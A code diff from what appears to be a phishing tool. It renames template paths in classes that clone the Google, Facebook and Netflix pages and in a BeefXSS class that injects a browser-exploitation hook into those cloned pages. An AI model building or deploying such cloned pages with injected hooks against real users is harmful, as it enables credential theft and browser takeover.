@@ -17,8 +17,8 @@ class Google:
         self.SEARCH_URL = 'https://www.google.com/search?source=hp&ei=xaMdXti3GYKYac_btcAO&q='
         self.user_agent = user_agent
         self.headers = {'User-Agent': self.user_agent}
-        self.path = 'illusion/templates/google/google_mobile.html' if is_mobile else 'illusion/templates/google/google_desktop.html'
-        self.search_path = 'illusion/templates/google_search/index.html'
+        self.path = 'disguise/templates/google/google_mobile.html' if is_mobile else 'disguise/templates/google/google_desktop.html'
+        self.search_path = 'disguise/templates/google_search/index.html'
         self.CHANGED = []
         self.is_mobile = is_mobile
 
@@ -117,7 +117,7 @@ class Facebook:
         self.URL = 'https://facebook.com/'
         self.user_agent = user_agent
         self.headers = {'User-Agent': self.user_agent}
-        self.path = 'illusion/templates/facebook/facebook_mobile.html' if is_mobile else 'illusion/templates/facebook/facebook_desktop.html'
+        self.path = 'disguise/templates/facebook/facebook_mobile.html' if is_mobile else 'disguise/templates/facebook/facebook_desktop.html'
         self.is_mobile = is_mobile
 
     def get_homepage(self):
@@ -167,7 +167,7 @@ class Netflix:
         self.URL = 'https://www.netflix.com/ma-en/login'
         self.user_agent = user_agent
         self.headers = {'User-Agent': self.user_agent}
-        self.path = 'illusion/templates/netflix/netflix_mobile.html' if is_mobile else 'illusion/templates/netflix/netflix_desktop.html'
+        self.path = 'disguise/templates/netflix/netflix_mobile.html' if is_mobile else 'disguise/templates/netflix/netflix_desktop.html'
         self.is_mobile = is_mobile
 
     def get_homepage(self):
@@ -227,13 +227,13 @@ class BeefXSS:
         return self.data
 
     def hook_template(self, template):
-        with open(f'illusion/templates/{template}', mode='r') as inf:
+        with open(f'disguise/templates/{template}', mode='r') as inf:
             self.data = inf.read()
 
             inf.close()
             content = self.inject_beef()
 
-            with open(f'illusion/templates/{template}', mode='w') as ouf:
+            with open(f'disguise/templates/{template}', mode='w') as ouf:
                 ouf.write(content)
                 ouf.close()
 
